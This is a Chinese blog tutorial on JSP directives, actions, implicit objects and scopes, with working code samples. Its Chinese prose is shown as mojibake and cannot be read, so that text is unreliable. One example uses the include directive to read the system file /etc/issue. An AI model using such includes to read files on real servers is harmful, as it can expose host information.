<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ [è®¾ç½®å†…å®¹] %&gt;</span><br></pre></td></tr></table></figure>
<p>æœ‰ä¸‰ç§æŒ‡ä»¤æ ‡ç­¾(æ‘˜è‡ª <a target="_blank" rel="noopener" href="https://www.w3cschool.cn/jsp/jsp-syntax.html">JSPè¯­æ³•</a> )ğŸ‘‡</p>
<table>
<thead>
<tr>
<th style="text-align:left"><strong>æŒ‡ä»¤</strong></th>
<th style="text-align:left"><strong>æè¿°</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">&lt;%@ page â€¦ %&gt;</td>
<td style="text-align:left">å®šä¹‰é¡µé¢çš„ä¾èµ–å±æ€§ï¼Œæ¯”å¦‚è„šæœ¬è¯­è¨€ã€erroré¡µé¢ã€ç¼“å­˜éœ€æ±‚ç­‰ç­‰</td>
</tr>
<tr>
<td style="text-align:left">&lt;%@ include â€¦ %&gt;</td>
<td style="text-align:left">åŒ…å«å…¶ä»–æ–‡ä»¶</td>
</tr>
<tr>
<td style="text-align:left">&lt;%@ taglib â€¦ %&gt;</td>
<td style="text-align:left">å¼•å…¥æ ‡ç­¾åº“çš„å®šä¹‰ï¼Œå¯ä»¥æ˜¯è‡ªå®šä¹‰æ ‡ç­¾</td>
</tr>
</tbody>
</table>
<h5 id="page">- page -</h5>
<p><code>page</code> æŒ‡ä»¤ç”¨æ¥å®šä¹‰é¡µé¢ä¾èµ–æ€§ï¼Œæ¯”å¦‚è„šæœ¬è¯­è¨€ã€erroré¡µé¢å’Œç¼“å­˜éœ€æ±‚ç­‰ï¼Œæ‹¥æœ‰ä»¥ä¸‹çš„å±æ€§åç§°ğŸ‘‡</p>
<ul>
<li><code>import</code></li>
<li><code>contentType</code></li>
<li><code>pageEncoding</code></li>
<li><code>language</code></li>
<li><code>errorPage</code></li>
<li><code>isErrorPage</code></li>
<li><code>info</code></li>
<li><code>session</code></li>
<li><code>......</code></li>
</ul>
<p>ä¾‹å¦‚ğŸ‘‡</p>
<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br></pre></td></tr></table></figure>
<p>ä»¥ä¸Š <code>import</code> çš„ä½œç”¨å³æ˜¯åœ¨ <code>jsp</code> é¡µé¢ä¸­å¼•å…¥éœ€è¦ç”¨åˆ°çš„ç±»æˆ–åŒ…ã€‚</p>
<p>æ¯”è¾ƒå¸¸è§çš„ğŸ‘‡</p>
<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> pageEncoding=<span class="string">&quot;utf-8&quot;</span> %&gt;</span><br></pre></td></tr></table></figure>
<p>å³è§„å®šè¯¥é¡µé¢çš„æ–‡æ¡£ç±»å‹å’Œæ‰€ä½¿ç”¨ç¼–ç éƒ½ä¸º <code>utf-8</code> ï¼Œå…¶æ¬¡å¯¹è¯¥é¡µé¢ä½¿ç”¨ <code>java</code> è¯­è¨€è¿›è¡Œè§£é‡Šã€‚</p>
<p>è¿˜æœ‰ğŸ‘‡</p>
<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page session=<span class="string">&quot;false&quot;</span> %&gt;</span><br></pre></td></tr></table></figure>
<p>å³æ˜¯å…³é—­äº† <code>jsp</code> ä¸­çš„å†…ç½® <code>session</code> å¯¹è±¡ã€‚</p>
<p>å’Œé”™è¯¯é¡µé¢ç›¸å…³çš„ğŸ‘‡</p>
<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page errorPage=<span class="string">&quot;error.jsp&quot;</span> %&gt;</span><br></pre></td></tr></table></figure>
<p>å°†å½“å‰é¡µé¢çš„é”™è¯¯é¡µé¢è®¾ä¸º <code>error.jsp</code> ï¼Œå³å¦‚æœåœ¨å½“å‰é¡µé¢æœ‰é”™è¯¯å‘ç”Ÿåˆ™ä½¿ç”¨ <code>error.jsp</code> é¡µé¢çš„å†…å®¹ã€‚</p>
<p>é”™è¯¯é¡µé¢ä¸Šçš„ğŸ‘‡</p>
<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page isErrorPage=<span class="string">&quot;true&quot;</span> %&gt;</span><br></pre></td></tr></table></figure>
<p>è¿™æ ·å°±å¯ä»¥åœ¨é”™è¯¯é¡µé¢ä¸­ç›´æ¥ä½¿ç”¨ <code>Exception</code> ç±»çš„ <code>exception</code> å¯¹è±¡ã€‚</p>
<p>å¦‚æœæƒ³å£°æ˜ <code>jsp</code> çš„ä¿¡æ¯å¯ä»¥ç”¨ä»¥ä¸‹ğŸ‘‡</p>
<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page info=<span class="string">&quot;123&quot;</span> %&gt;</span><br></pre></td></tr></table></figure>
<p>è¿™æ ·å¯ä»¥ä» <code>Servlet.getServletInfo()</code> ä¸­è·å–åˆ°ã€‚</p>
<h5 id="include">- include -</h5>
<p>è¿™ä¸ªæŒ‡ä»¤æœ‰ç‚¹åƒ <code>php</code> ä¸­çš„ <code>include</code> ï¼Œç”¨ä»¥åŒ…å«ä¸€äº› <code>jsp</code> æˆ–æ˜¯ <code>html</code> æ–‡ä»¶çš„å†…å®¹ï¼Œä½†å¹¶æ²¡æœ‰æ–‡ä»¶æ ¼å¼çš„é™åˆ¶ï¼Œæ¯”å¦‚ğŸ‘‡</p>
<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ include file=<span class="string">&quot;/etc/issue&quot;</span> %&gt;</span><br></pre></td></tr></table></figure>
<p>å¯ä»¥å°† <code>/etc/issue</code> æ–‡ä»¶çš„å†…å®¹è¯»å–å‡ºæ¥ã€‚</p>
<h5 id="taglib">- taglib -</h5>
<p>ç”¨ä»¥å¼•å…¥æ ‡ç­¾åº“ï¼Œå¦‚ä»¥ <code>JSTL</code> æ ‡ç­¾åº“ä¸ºä¾‹ğŸ‘‡</p>
<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ taglib prefix=<span class="string">&quot;c&quot;</span> uri=<span class="string">&quot;http://java.sun.com/jsp/jstl/core&quot;</span> %&gt;</span><br></pre></td></tr></table></figure>
<p>å…¶ä¸­ <code>prefix</code> ä¸ºæ ‡ç­¾å‰ç¼€ï¼Œ<code>uri</code> ä¸ºç±»åº“çš„åœ°å€ã€‚</p>
<h4 id="è¡Œä¸º-action">- è¡Œä¸º(action) -</h4>
<p>è¿™ä¸ªå…¶å®å°±æ˜¯ <code>jsp</code> ä¸­å†…ç½®çš„ <code>æ ‡ç­¾</code> ï¼Œä½¿ç”¨ <code>XML</code> è¯­æ³•ç»“æ„ã€‚æ¯”å¦‚ä¸Šé¢è¯­æ³•ä¸­æ‰€è¿°çš„ <code>XML</code> ç­‰ä»·è¯­å¥å…¶å®å°±æ˜¯ <code>jsp</code> çš„è¡Œä¸ºã€‚</p>
<p>è¡Œä¸ºçš„è¯­æ³•æ ¼å¼ğŸ‘‡</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;jsp:[è¡Œä¸ºåç§°] [å±æ€§å]=[å€¼]&gt;</span><br></pre></td></tr></table></figure>
<p>æ¯”å¦‚ä¸€äº›è¡Œä¸º(æ‘˜è‡ª <a target="_blank" rel="noopener" href="https://www.w3cschool.cn/jsp/jsp-syntax.html">JSPè¯­æ³•</a> )ğŸ‘‡</p>
<table>
<thead>
<tr>
<th style="text-align:left"><strong>è¯­æ³•</strong></th>
<th style="text-align:left"><strong>æè¿°</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">jsp:include</td>
<td style="text-align:left">ç”¨äºåœ¨å½“å‰é¡µé¢ä¸­åŒ…å«é™æ€æˆ–åŠ¨æ€èµ„æº</td>
</tr>
<tr>
<td style="text-align:left">jsp:useBean</td>
<td style="text-align:left">å¯»æ‰¾å’Œåˆå§‹åŒ–ä¸€ä¸ªJavaBeanç»„ä»¶</td>
</tr>
<tr>
<td style="text-align:left">jsp:setProperty</td>
<td style="text-align:left">è®¾ç½® JavaBeanç»„ä»¶çš„å€¼</td>
</tr>
<tr>
<td style="text-align:left">jsp:getProperty</td>
<td style="text-align:left">å°† JavaBeanç»„ä»¶çš„å€¼æ’å…¥åˆ° outputä¸­</td>
</tr>
<tr>
<td style="text-align:left">jsp:forward</td>
<td style="text-align:left">ä»ä¸€ä¸ªJSPæ–‡ä»¶å‘å¦ä¸€ä¸ªæ–‡ä»¶ä¼ é€’ä¸€ä¸ªåŒ…å«ç”¨æˆ·è¯·æ±‚çš„requestå¯¹è±¡</td>
</tr>
<tr>
<td style="text-align:left">jsp:plugin</td>
<td style="text-align:left">ç”¨äºåœ¨ç”Ÿæˆçš„HTMLé¡µé¢ä¸­åŒ…å«Appletå’ŒJavaBeanå¯¹è±¡</td>
</tr>
<tr>
<td style="text-align:left">jsp:element</td>
<td style="text-align:left">åŠ¨æ€åˆ›å»ºä¸€ä¸ªXMLå…ƒç´ </td>
</tr>
<tr>
<td style="text-align:left">jsp:attribute</td>
<td style="text-align:left">å®šä¹‰åŠ¨æ€åˆ›å»ºçš„XMLå…ƒç´ çš„å±æ€§</td>
</tr>
<tr>
<td style="text-align:left">jsp:body</td>
<td style="text-align:left">å®šä¹‰åŠ¨æ€åˆ›å»ºçš„XMLå…ƒç´ çš„ä¸»ä½“</td>
</tr>
<tr>
<td style="text-align:left">jsp:text</td>
<td style="text-align:left">ç”¨äºå°è£…æ¨¡æ¿æ•°æ®</td>
</tr>
</tbody>
</table>
<h5 id="include-2">- include -</h5>
<p>å’Œä¸Šé¢æŒ‡ä»¤çš„ <code>include</code> åœ¨åŒ…å«å½¢å¦‚ <code>jsp</code> æ–‡ä»¶æ—¶æ‰€è¿›è¡Œæ“ä½œä¸åŒï¼Œè¡Œä¸ºä¸­çš„ <code>include</code> æ˜¯å…ˆå°†æ‰€è¦åŒ…å«çš„ <code>jsp</code> æ–‡ä»¶ç¼–è¯‘æ‰§è¡Œäº†ï¼Œç„¶åå°†æ‰§è¡Œçš„ç»“æœå†…å®¹åŒ…å«è¿›æ¥ï¼›è€ŒæŒ‡ä»¤çš„ <code>include</code> åˆ™å°†æ‰€è¦åŒ…å«çš„ <code>jsp</code> æ–‡ä»¶çš„å†…å®¹è¿åŒè‡ªå·±çš„å†…å®¹åˆå¹¶äº†å†ç¼–è¯‘æ‰§è¡Œã€‚</p>
<p>æ¯”å¦‚åœ¨ <code>test.jsp</code> é¡µé¢ä¸­ğŸ‘‡</p>
<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;jsp:include page=<span class="string">&quot;index.jsp&quot;</span>&gt;</span><br></pre></td></tr></table></figure>
<p>ç›¸å½“äºå°† <code>index.jsp</code> é¡µé¢åŠ è½½å®Œæ¯•åçš„å†…å®¹æ‹¼æ¥åˆ° <code>test.jsp</code> é¡µé¢å¯¹åº” <code>&lt;jsp:include&gt;</code> çš„ä½ç½®ã€‚</p>
<h5 id="bean">- bean -</h5>
<p>æœ‰å…³ <code>javaBean</code> çš„è¡Œä¸ºï¼ŒåŒ…æ‹¬ <code>useBean</code> ï¼Œ<code>setProperty</code> å’Œ <code>getProperty</code> ã€‚æ¯”å¦‚æ„é€ ä»¥ä¸‹çš„ <code>bean</code> ç±»ğŸ‘‡</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> person;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PersonBean</span> <span class="keyword">implements</span> <span class="title">java</span>.<span class="title">io</span>.<span class="title">Serializable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String name = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">private</span> String text = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">PersonBean</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getText</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.text;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String var1)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = var1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setText</span><span class="params">(String var1)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.text = var1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> var1)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = var1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ç„¶åå°†å…¶æ‰“åŒ…æˆ <code>jar</code> ğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202231817008.png" alt="image-20220223181751792"></p>
<p>ä¸€ä¸ªç®€å•çš„ç¤ºä¾‹ğŸ‘‡</p>
<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;jsp:useBean id=<span class="string">&quot;person&quot;</span> <span class="class"><span class="keyword">class</span></span>=<span class="string">&quot;person.PersonBean&quot;</span> scope=<span class="string">&quot;page&quot;</span> &gt;</span><br><span class="line">    &lt;jsp:setProperty name=<span class="string">&quot;person&quot;</span> property=<span class="string">&quot;name&quot;</span> value=<span class="string">&quot;dq&quot;</span>/&gt;</span><br><span class="line">    &lt;jsp:setProperty name=<span class="string">&quot;person&quot;</span> property=<span class="string">&quot;age&quot;</span> value=<span class="string">&quot;1&quot;</span>/&gt;</span><br><span class="line">    &lt;jsp:setProperty name=<span class="string">&quot;person&quot;</span> property=<span class="string">&quot;text&quot;</span> value=<span class="string">&quot;test&quot;</span>/&gt;</span><br><span class="line">&lt;/jsp:useBean&gt;</span><br><span class="line">&lt;ul&gt;</span><br><span class="line">    &lt;li&gt;&lt;jsp:getProperty name=<span class="string">&quot;person&quot;</span> property=<span class="string">&quot;name&quot;</span>/&gt;&lt;/li&gt;</span><br><span class="line">    &lt;li&gt;&lt;jsp:getProperty name=<span class="string">&quot;person&quot;</span> property=<span class="string">&quot;age&quot;</span>/&gt;&lt;/li&gt;</span><br><span class="line">    &lt;li&gt;&lt;jsp:getProperty name=<span class="string">&quot;person&quot;</span> property=<span class="string">&quot;text&quot;</span>/&gt;&lt;/li&gt;</span><br><span class="line">&lt;/ul&gt;</span><br></pre></td></tr></table></figure>
<p>å…¶ä¸­ğŸ‘‡</p>
<ul>
<li>
<p><code>&lt;jsp:setProperty&gt;</code> ç”¨ä»¥æŒ‡å®šå¯¹åº”åç§°çš„ <code>bean</code> æ‰€ä½¿ç”¨çš„ <code>bean</code> ç±»ï¼Œä»¥åŠä½œç”¨åŸŸï¼Œæ¯”å¦‚è¿™é‡Œçš„æ„æ€æ˜¯ä½œç”¨åŸŸä¸ºå½“å‰é¡µé¢ï¼Œåç§°ä¸º <code>person</code> ï¼Œä½¿ç”¨ <code>person.PersonBean</code> ç±»çš„ <code>bean</code></p>
</li>
<li>
<p><code>&lt;jsp:setProperty&gt;</code> ç”¨ä»¥å¯¹æŒ‡å®šåç§°çš„ <code>bean</code> ä¸­å¯¹åº”å±æ€§èµ‹å€¼</p>
</li>
<li>
<p><code>&lt;jsp:getProperty&gt;</code> ç”¨ä»¥è·å–æŒ‡å®šåç§°çš„ <code>bean</code> ä¸­æŒ‡å®šå±æ€§çš„å€¼</p>
</li>
</ul>
<p>å¾—åˆ°ç»“æœğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202231824104.png" alt="image-20220223182424982"></p>
<p>å½“ç„¶ <code>&lt;jsp:useBean&gt;</code> å®è´¨æ˜¯åœ¨æŒ‡å®šçš„ä½œç”¨åŸŸå†…å®ä¾‹åŒ–å¯¹åº”çš„ç±»ï¼Œè€Œè¿™ä¸ªç±»ä¸ä¸€å®šå¾—æ˜¯çœŸæ­£çš„ <code>bean</code> ç±»ï¼Œåªè¦æ˜¯å¯åºåˆ—åŒ–çš„éƒ½è¡Œã€‚</p>
<h5 id="xml">- xml -</h5>
<p>å…¶å®å°±æ˜¯ç”¨ <code>element</code> ï¼Œ<code>attribute</code> ï¼Œ<code>body</code> å’Œ <code>text</code> æ„å»º <code>xml</code> å†…å®¹ï¼Œæ¯”å¦‚ğŸ‘‡</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">jsp:element</span> <span class="attr">name</span>=<span class="string">&quot;e1&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">jsp:attribute</span> <span class="attr">name</span>=<span class="string">&quot;a1&quot;</span> <span class="attr">trim</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line">        a1_value</span><br><span class="line">    <span class="tag">&lt;/<span class="name">jsp:attribute</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">jsp:attribute</span> <span class="attr">name</span>=<span class="string">&quot;a2&quot;</span> <span class="attr">trim</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line">        a2_value</span><br><span class="line">    <span class="tag">&lt;/<span class="name">jsp:attribute</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">jsp:body</span> &gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">jsp:element</span> <span class="attr">name</span>=<span class="string">&quot;e2&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">jsp:attribute</span> <span class="attr">name</span>=<span class="string">&quot;a3&quot;</span>&gt;</span></span><br><span class="line">                a3_value</span><br><span class="line">            <span class="tag">&lt;/<span class="name">jsp:attribute</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">jsp:body</span>&gt;</span>test<span class="tag">&lt;/<span class="name">jsp:body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">jsp:element</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">jsp:body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">jsp:element</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>å¾—åˆ°ç»“æœğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202231844978.png" alt="image-20220223184433857"></p>
<h5 id="forward">- forward -</h5>
<p>ç”¨ä»¥å®ç°è¯·æ±‚è½¬å‘åŠŸèƒ½ï¼Œç±»ä¼¼ <code>request.getRequestDispatcher(&quot;page&quot;).forward(request,response)</code> ï¼Œç®€å•æ¥è¯´å³æ˜¯å°†è¯·æ±‚å’Œå“åº”å†…å®¹åŸå°ä¸åŠ¨åœ°äº¤ç»™å¦ä¸€ä¸ªé¡µé¢è¿›è¡Œå¤„ç†ï¼Œé¡µé¢å†…å®¹æ˜¾ç¤ºçš„æ˜¯å¦ä¸€ä¸ªé¡µé¢çš„å†…å®¹ã€‚</p>
<p>æ¯”å¦‚åœ¨ <code>a.jsp</code>ğŸ‘‡</p>
<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;a&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;jsp:forward page=<span class="string">&quot;b.jsp&quot;</span>&gt;</span><br><span class="line">    &lt;jsp:param name=<span class="string">&quot;a&quot;</span> value=<span class="string">&quot;123&quot;</span>/&gt;</span><br><span class="line">&lt;/jsp:forward&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>åœ¨ <code>b.jsp</code>ğŸ‘‡</p>
<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;b&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    out.println(request.getParameter(<span class="string">&quot;a&quot;</span>));</span><br><span class="line">    out.println(request.getParameter(<span class="string">&quot;b&quot;</span>));</span><br><span class="line">%&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>å½“ä»¥ <code>?b=321</code> å»è®¿é—® <code>a.jsp</code> æ—¶ğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202231855923.png" alt="image-20220223185500826"></p>
<p>è™½ç„¶è®¿é—®çš„æ˜¯ <code>a.jsp?b=321</code> ä½†æ˜¾ç¤ºå‡ºæ¥çš„å†…å®¹ä¸º <code>b.jsp</code> é¡µé¢çš„å†…å®¹ï¼Œè¿™æ„å‘³ç€åœ¨ <code>b.jsp</code> ä¸­å¯ä»¥ä½¿ç”¨ <code>a.jsp</code> çš„ <code>request</code> å’Œ <code>response</code>ã€‚</p>
<h4 id="ä¹å¤§å†…ç½®å¯¹è±¡">- ä¹å¤§å†…ç½®å¯¹è±¡ -</h4>
<p>ç”±äºåœ¨ <code>jsp</code> ä¸­éšè—ç€ä¹ä¸ªå†…ç½®å¯¹è±¡ï¼Œè¿™ä½¿å¾— <code>jsp</code> æ¯” <code>serlvet</code> ç”¨èµ·æ¥æ›´ä¸ºæ–¹ä¾¿(æ‘˜è‡ª <a target="_blank" rel="noopener" href="https://www.w3cschool.cn/jsp/jsp-syntax.html">JSPè¯­æ³•</a> )ğŸ‘‡</p>
<table>
<thead>
<tr>
<th style="text-align:left"><strong>å¯¹è±¡</strong></th>
<th style="text-align:left"><strong>æè¿°</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">request</td>
<td style="text-align:left"><strong>HttpServletRequest</strong>ç±»çš„å®ä¾‹</td>
</tr>
<tr>
<td style="text-align:left">response</td>
<td style="text-align:left"><strong>HttpServletResponse</strong>ç±»çš„å®ä¾‹</td>
</tr>
<tr>
<td style="text-align:left">out</td>
<td style="text-align:left"><strong>PrintWriter</strong>ç±»çš„å®ä¾‹ï¼Œç”¨äºæŠŠç»“æœè¾“å‡ºè‡³ç½‘é¡µä¸Š</td>
</tr>
<tr>
<td style="text-align:left">session</td>
<td style="text-align:left"><strong>HttpSession</strong>ç±»çš„å®ä¾‹</td>
</tr>
<tr>
<td style="text-align:left">application</td>
<td style="text-align:left"><strong>ServletContext</strong>ç±»çš„å®ä¾‹ï¼Œä¸åº”ç”¨ä¸Šä¸‹æ–‡æœ‰å…³</td>
</tr>
<tr>
<td style="text-align:left">config</td>
<td style="text-align:left"><strong>ServletConfig</strong>ç±»çš„å®ä¾‹</td>
</tr>
<tr>
<td style="text-align:left">pageContext</td>
<td style="text-align:left"><strong>PageContext</strong>ç±»çš„å®ä¾‹ï¼Œæä¾›å¯¹JSPé¡µé¢æ‰€æœ‰å¯¹è±¡ä»¥åŠå‘½åç©ºé—´çš„è®¿é—®</td>
</tr>
<tr>
<td style="text-align:left">page</td>
<td style="text-align:left">ç±»ä¼¼äºJavaç±»ä¸­çš„thiså…³é”®å­—</td>
</tr>
<tr>
<td style="text-align:left">Exception</td>
<td style="text-align:left"><strong>Exception</strong>ç±»çš„å¯¹è±¡ï¼Œä»£è¡¨å‘ç”Ÿé”™è¯¯çš„JSPé¡µé¢ä¸­å¯¹åº”çš„å¼‚å¸¸å¯¹è±¡</td>
</tr>
</tbody>
</table>
<h4 id="å››å¤§ä½œç”¨åŸŸ">- å››å¤§ä½œç”¨åŸŸ -</h4>
<p>å…¶å®å°±æ˜¯ä¹å¤§å†…ç½®å¯¹è±¡ä¸­çš„å››ä¸ªï¼Œå› ä¸ºè¿™å››ä¸ªå¯¹è±¡éƒ½å¯ä»¥ç”¨ <code>setAttribute</code> æ–¹æ³•æ¥å­˜å‚¨æ•°æ®ï¼Œç”¨ <code>getAttribute</code> è·å–æ•°æ®ã€‚</p>
<h5 id="application">- application -</h5>
<p>å­˜åœ¨ <code>application</code> çš„æ•°æ®å¯ä»¥åœ¨æœåŠ¡å™¨ä¸‹çš„å¤šä¸ªåº”ç”¨ä¸­è®¿é—®ã€‚</p>
<h5 id="page-2">- page -</h5>
<p>å­˜åœ¨ <code>page </code> çš„æ•°æ®åªèƒ½åœ¨å½“å‰é¡µé¢ä¸­è®¿é—®ã€‚</p>
<h5 id="request">- request -</h5>
<p>å­˜åœ¨ <code>request</code> çš„æ•°æ®å¯ä»¥åœ¨åŒä¸€æ¬¡è¯·æ±‚ä¸­è®¿é—®ï¼Œå¦‚å¯ä»¥é€šè¿‡è¯·æ±‚è½¬å‘å½¢å¼åœ¨ <code>b.jsp</code> é¡µé¢ä¸­è®¿é—® <code>a.jsp</code> é¡µé¢å­˜åœ¨ <code>request</code> çš„æ•°æ®ã€‚</p>
<h5 id="session">- session -</h5>
<p>å­˜åœ¨ <code>session</code> çš„æ•°æ®å¯ä»¥åœ¨åŒä¸€ä¼šè¯ä¸­è®¿é—®ï¼Œä¸€èˆ¬æ¥è¯´å¯ä»¥åœ¨åŒä¸€ä¸ªé¡¹ç›®ä¸‹çš„æ‰€æœ‰é¡µé¢è®¿é—®åˆ°ã€‚</p>
<h4 id="æ ‡ç­¾-tag">- æ ‡ç­¾(tag) -</h4>
<p>å®è¯è¯´ï¼Œæ ‡ç­¾ç”¨èµ·æ¥æ„Ÿè§‰è¿˜æŒºæ–¹ä¾¿ã€‚</p>
